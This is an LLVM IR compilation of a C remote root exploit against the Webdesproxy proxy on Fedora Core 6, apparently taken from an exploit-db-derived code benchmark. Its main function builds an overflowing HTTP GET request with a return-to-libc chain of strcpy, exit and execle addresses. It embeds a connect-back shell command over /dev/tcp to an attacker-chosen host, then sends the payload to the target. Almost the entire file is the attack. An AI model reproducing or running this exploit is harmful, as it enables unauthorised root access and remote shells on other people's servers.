; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3922.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3922.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [109 x i8] c"\0A Fedora Core 6 (exec-shield) based\0A Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\0A by Xpl017Elz\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [70 x i8] c" Usage: %s [host] [port] [conn-back host] [input port] [output port]\0A\00", align 1
@.str.2 = private unnamed_addr constant [62 x i8] c" Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"GET http://\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c" [+] make execle() address.\0A\00", align 1
@STRCPY_PLT = common dso_local global i64 0, align 8
@MOVE_ESP = common dso_local global i64 0, align 8
@EXIT_GOT = common dso_local global i64 0, align 8
@EXECLE_00_0xff = common dso_local global i64 0, align 8
@EXECLE_08_0xff = common dso_local global i64 0, align 8
@EXECLE_16_0xff = common dso_local global i64 0, align 8
@BIN_SH_END = common dso_local global i64 0, align 8
@NULL_STR = common dso_local global i64 0, align 8
@C_OPTION_END = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [43 x i8] c" [+] execle() argument align padddding...\0A\00", align 1
@RET_CODE_COUNT = common dso_local global i32 0, align 4
@RET_CODE = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [28 x i8] c" [+] make execute command.\0A\00", align 1
@EXIT_PLT = common dso_local global i64 0, align 8
@BIN_SH_LOC = common dso_local global i64 0, align 8
@C_OPTION_LOC = common dso_local global i64 0, align 8
@CONN_BACK_LOC = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [39 x i8] c" [+] make connect-back shell command.\0A\00", align 1
@.str.8 = private unnamed_addr constant [46 x i8] c"/bin/shx-cxsh</dev/tcp/%s/%d>/dev/tcp/%s/%d;\0A\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c" [+] connect host: %s:%d.\0A\00", align 1
@.str.10 = private unnamed_addr constant [30 x i8] c" [-] gethostbyname() error.\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [23 x i8] c" [-] socket() error.\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [24 x i8] c" [-] connect() error.\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c" [+] exploit size: %d.\0A\00", align 1
@.str.14 = private unnamed_addr constant [20 x i8] c" [+] send exploit.\0A\00", align 1
@.str.15 = private unnamed_addr constant [45 x i8] c" [*] checking, your connect-back host. :-}\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %13 = call i32 @memset(i8* %12, i32 0, i32 4096)
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 6
  br i1 %16, label %17, label %26

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.2, i64 0, i64 0), i8* %24)
  store i32 -1, i32* %3, align 4
  br label %338

26:                                               ; preds = %2
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %28 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  %29 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %30 = call i32 @strlen(i8* %29)
  store i32 %30, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %31

31:                                               ; preds = %39, %26
  %32 = load i32, i32* %6, align 4
  %33 = icmp slt i32 %32, 220
  br i1 %33, label %34, label %42

34:                                               ; preds = %31
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %37
  store i8 120, i8* %38, align 1
  br label %39

39:                                               ; preds = %34
  %40 = load i32, i32* %6, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %6, align 4
  br label %31

42:                                               ; preds = %31
  store i32 0, i32* %6, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  %44 = load i64, i64* @STRCPY_PLT, align 8
  %45 = load i32, i32* %7, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %46
  %48 = bitcast i8* %47 to i64*
  store i64 %44, i64* %48, align 1
  %49 = load i32, i32* %7, align 4
  %50 = add nsw i32 %49, 4
  store i32 %50, i32* %7, align 4
  %51 = load i64, i64* @MOVE_ESP, align 8
  %52 = load i32, i32* %7, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %53
  %55 = bitcast i8* %54 to i64*
  store i64 %51, i64* %55, align 1
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, 4
  store i32 %57, i32* %7, align 4
  %58 = load i64, i64* @EXIT_GOT, align 8
  %59 = load i32, i32* %6, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %6, align 4
  %61 = sext i32 %59 to i64
  %62 = add nsw i64 %58, %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %64
  %66 = bitcast i8* %65 to i64*
  store i64 %62, i64* %66, align 1
  %67 = load i32, i32* %7, align 4
  %68 = add nsw i32 %67, 4
  store i32 %68, i32* %7, align 4
  %69 = load i64, i64* @EXECLE_00_0xff, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %71
  %73 = bitcast i8* %72 to i64*
  store i64 %69, i64* %73, align 1
  %74 = load i32, i32* %7, align 4
  %75 = add nsw i32 %74, 4
  store i32 %75, i32* %7, align 4
  %76 = load i64, i64* @STRCPY_PLT, align 8
  %77 = load i32, i32* %7, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %78
  %80 = bitcast i8* %79 to i64*
  store i64 %76, i64* %80, align 1
  %81 = load i32, i32* %7, align 4
  %82 = add nsw i32 %81, 4
  store i32 %82, i32* %7, align 4
  %83 = load i64, i64* @MOVE_ESP, align 8
  %84 = load i32, i32* %7, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %85
  %87 = bitcast i8* %86 to i64*
  store i64 %83, i64* %87, align 1
  %88 = load i32, i32* %7, align 4
  %89 = add nsw i32 %88, 4
  store i32 %89, i32* %7, align 4
  %90 = load i64, i64* @EXIT_GOT, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %6, align 4
  %93 = sext i32 %91 to i64
  %94 = add nsw i64 %90, %93
  %95 = load i32, i32* %7, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %96
  %98 = bitcast i8* %97 to i64*
  store i64 %94, i64* %98, align 1
  %99 = load i32, i32* %7, align 4
  %100 = add nsw i32 %99, 4
  store i32 %100, i32* %7, align 4
  %101 = load i64, i64* @EXECLE_08_0xff, align 8
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %103
  %105 = bitcast i8* %104 to i64*
  store i64 %101, i64* %105, align 1
  %106 = load i32, i32* %7, align 4
  %107 = add nsw i32 %106, 4
  store i32 %107, i32* %7, align 4
  %108 = load i64, i64* @STRCPY_PLT, align 8
  %109 = load i32, i32* %7, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %110
  %112 = bitcast i8* %111 to i64*
  store i64 %108, i64* %112, align 1
  %113 = load i32, i32* %7, align 4
  %114 = add nsw i32 %113, 4
  store i32 %114, i32* %7, align 4
  %115 = load i64, i64* @MOVE_ESP, align 8
  %116 = load i32, i32* %7, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %117
  %119 = bitcast i8* %118 to i64*
  store i64 %115, i64* %119, align 1
  %120 = load i32, i32* %7, align 4
  %121 = add nsw i32 %120, 4
  store i32 %121, i32* %7, align 4
  %122 = load i64, i64* @EXIT_GOT, align 8
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %6, align 4
  %125 = sext i32 %123 to i64
  %126 = add nsw i64 %122, %125
  %127 = load i32, i32* %7, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %128
  %130 = bitcast i8* %129 to i64*
  store i64 %126, i64* %130, align 1
  %131 = load i32, i32* %7, align 4
  %132 = add nsw i32 %131, 4
  store i32 %132, i32* %7, align 4
  %133 = load i64, i64* @EXECLE_16_0xff, align 8
  %134 = load i32, i32* %7, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %135
  %137 = bitcast i8* %136 to i64*
  store i64 %133, i64* %137, align 1
  %138 = load i32, i32* %7, align 4
  %139 = add nsw i32 %138, 4
  store i32 %139, i32* %7, align 4
  %140 = load i64, i64* @STRCPY_PLT, align 8
  %141 = load i32, i32* %7, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %142
  %144 = bitcast i8* %143 to i64*
  store i64 %140, i64* %144, align 1
  %145 = load i32, i32* %7, align 4
  %146 = add nsw i32 %145, 4
  store i32 %146, i32* %7, align 4
  %147 = load i64, i64* @MOVE_ESP, align 8
  %148 = load i32, i32* %7, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %149
  %151 = bitcast i8* %150 to i64*
  store i64 %147, i64* %151, align 1
  %152 = load i32, i32* %7, align 4
  %153 = add nsw i32 %152, 4
  store i32 %153, i32* %7, align 4
  %154 = load i64, i64* @BIN_SH_END, align 8
  %155 = load i32, i32* %7, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %156
  %158 = bitcast i8* %157 to i64*
  store i64 %154, i64* %158, align 1
  %159 = load i32, i32* %7, align 4
  %160 = add nsw i32 %159, 4
  store i32 %160, i32* %7, align 4
  %161 = load i64, i64* @NULL_STR, align 8
  %162 = load i32, i32* %7, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %163
  %165 = bitcast i8* %164 to i64*
  store i64 %161, i64* %165, align 1
  %166 = load i32, i32* %7, align 4
  %167 = add nsw i32 %166, 4
  store i32 %167, i32* %7, align 4
  %168 = load i64, i64* @STRCPY_PLT, align 8
  %169 = load i32, i32* %7, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %170
  %172 = bitcast i8* %171 to i64*
  store i64 %168, i64* %172, align 1
  %173 = load i32, i32* %7, align 4
  %174 = add nsw i32 %173, 4
  store i32 %174, i32* %7, align 4
  %175 = load i64, i64* @MOVE_ESP, align 8
  %176 = load i32, i32* %7, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %177
  %179 = bitcast i8* %178 to i64*
  store i64 %175, i64* %179, align 1
  %180 = load i32, i32* %7, align 4
  %181 = add nsw i32 %180, 4
  store i32 %181, i32* %7, align 4
  %182 = load i64, i64* @C_OPTION_END, align 8
  %183 = load i32, i32* %7, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %184
  %186 = bitcast i8* %185 to i64*
  store i64 %182, i64* %186, align 1
  %187 = load i32, i32* %7, align 4
  %188 = add nsw i32 %187, 4
  store i32 %188, i32* %7, align 4
  %189 = load i64, i64* @NULL_STR, align 8
  %190 = load i32, i32* %7, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %191
  %193 = bitcast i8* %192 to i64*
  store i64 %189, i64* %193, align 1
  %194 = load i32, i32* %7, align 4
  %195 = add nsw i32 %194, 4
  store i32 %195, i32* %7, align 4
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %197

197:                                              ; preds = %209, %42
  %198 = load i32, i32* %6, align 4
  %199 = load i32, i32* @RET_CODE_COUNT, align 4
  %200 = icmp slt i32 %198, %199
  br i1 %200, label %201, label %212

201:                                              ; preds = %197
  %202 = load i64, i64* @RET_CODE, align 8
  %203 = load i32, i32* %7, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %204
  %206 = bitcast i8* %205 to i64*
  store i64 %202, i64* %206, align 1
  %207 = load i32, i32* %7, align 4
  %208 = add nsw i32 %207, 4
  store i32 %208, i32* %7, align 4
  br label %209

209:                                              ; preds = %201
  %210 = load i32, i32* %6, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %6, align 4
  br label %197

212:                                              ; preds = %197
  %213 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0))
  %214 = load i64, i64* @EXIT_PLT, align 8
  %215 = load i32, i32* %7, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %216
  %218 = bitcast i8* %217 to i64*
  store i64 %214, i64* %218, align 1
  %219 = load i32, i32* %7, align 4
  %220 = add nsw i32 %219, 4
  store i32 %220, i32* %7, align 4
  %221 = load i32, i32* %7, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %222
  %224 = bitcast i8* %223 to i64*
  store i64 2189591170, i64* %224, align 1
  %225 = load i32, i32* %7, align 4
  %226 = add nsw i32 %225, 4
  store i32 %226, i32* %7, align 4
  %227 = load i64, i64* @BIN_SH_LOC, align 8
  %228 = load i32, i32* %7, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %229
  %231 = bitcast i8* %230 to i64*
  store i64 %227, i64* %231, align 1
  %232 = load i32, i32* %7, align 4
  %233 = add nsw i32 %232, 4
  store i32 %233, i32* %7, align 4
  %234 = load i64, i64* @BIN_SH_LOC, align 8
  %235 = load i32, i32* %7, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %236
  %238 = bitcast i8* %237 to i64*
  store i64 %234, i64* %238, align 1
  %239 = load i32, i32* %7, align 4
  %240 = add nsw i32 %239, 4
  store i32 %240, i32* %7, align 4
  %241 = load i64, i64* @C_OPTION_LOC, align 8
  %242 = load i32, i32* %7, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %243
  %245 = bitcast i8* %244 to i64*
  store i64 %241, i64* %245, align 1
  %246 = load i32, i32* %7, align 4
  %247 = add nsw i32 %246, 4
  store i32 %247, i32* %7, align 4
  %248 = load i64, i64* @CONN_BACK_LOC, align 8
  %249 = load i32, i32* %7, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %250
  %252 = bitcast i8* %251 to i64*
  store i64 %248, i64* %252, align 1
  %253 = load i32, i32* %7, align 4
  %254 = add nsw i32 %253, 4
  store i32 %254, i32* %7, align 4
  %255 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  %256 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %257 = load i32, i32* %7, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8, i8* %256, i64 %258
  %260 = load i8**, i8*** %5, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 3
  %262 = load i8*, i8** %261, align 8
  %263 = load i8**, i8*** %5, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 4
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265)
  %267 = load i8**, i8*** %5, align 8
  %268 = getelementptr inbounds i8*, i8** %267, i64 3
  %269 = load i8*, i8** %268, align 8
  %270 = load i8**, i8*** %5, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 5
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272)
  %274 = call i32 (i8*, i8*, ...) @sprintf(i8* %259, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.8, i64 0, i64 0), i8* %262, i32 %266, i8* %269, i32 %273)
  %275 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %276 = call i32 @strlen(i8* %275)
  store i32 %276, i32* %7, align 4
  %277 = load i8**, i8*** %5, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 1
  %279 = load i8*, i8** %278, align 8
  %280 = load i8**, i8*** %5, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 2
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282)
  %284 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0), i8* %279, i32 %283)
  %285 = load i8**, i8*** %5, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 1
  %287 = load i8*, i8** %286, align 8
  %288 = call %struct.hostent* @gethostbyname(i8* %287)
  store %struct.hostent* %288, %struct.hostent** %10, align 8
  %289 = load %struct.hostent*, %struct.hostent** %10, align 8
  %290 = icmp eq %struct.hostent* %289, null
  br i1 %290, label %291, label %293

291:                                              ; preds = %212
  %292 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %338

293:                                              ; preds = %212
  %294 = load i32, i32* @AF_INET, align 4
  %295 = load i32, i32* @SOCK_STREAM, align 4
  %296 = call i32 @socket(i32 %294, i32 %295, i32 0)
  store i32 %296, i32* %8, align 4
  %297 = load i32, i32* %8, align 4
  %298 = icmp eq i32 %297, -1
  br i1 %298, label %299, label %301

299:                                              ; preds = %293
  %300 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %338

301:                                              ; preds = %293
  %302 = load i32, i32* @AF_INET, align 4
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  store i32 %302, i32* %303, align 4
  %304 = load i8**, i8*** %5, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 2
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 @atoi(i8* %306)
  %308 = call i32 @htons(i32 %307)
  %309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %308, i32* %309, align 4
  %310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %311 = load %struct.hostent*, %struct.hostent** %10, align 8
  %312 = getelementptr inbounds %struct.hostent, %struct.hostent* %311, i32 0, i32 0
  %313 = load i64, i64* %312, align 8
  %314 = inttoptr i64 %313 to %struct.in_addr*
  %315 = bitcast %struct.in_addr* %310 to i8*
  %316 = bitcast %struct.in_addr* %314 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %315, i8* align 4 %316, i64 4, i1 false)
  %317 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %318 = call i32 @bzero(i32* %317, i32 8)
  %319 = load i32, i32* %8, align 4
  %320 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %321 = call i32 @connect(i32 %319, %struct.sockaddr* %320, i32 4)
  store i32 %321, i32* %6, align 4
  %322 = load i32, i32* %6, align 4
  %323 = icmp eq i32 %322, -1
  br i1 %323, label %324, label %326

324:                                              ; preds = %301
  %325 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %338

326:                                              ; preds = %301
  %327 = load i32, i32* %7, align 4
  %328 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i32 %327)
  %329 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.14, i64 0, i64 0))
  %330 = load i32, i32* %8, align 4
  %331 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %332 = load i32, i32* %7, align 4
  %333 = call i32 @send(i32 %330, i8* %331, i32 %332, i32 0)
  %334 = load i32, i32* %8, align 4
  %335 = call i32 @close(i32 %334)
  %336 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.15, i64 0, i64 0))
  %337 = call i32 @exit(i32 0) #4
  unreachable

338:                                              ; preds = %324, %299, %291, %17
  %339 = load i32, i32* %3, align 4
  ret i32 %339
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
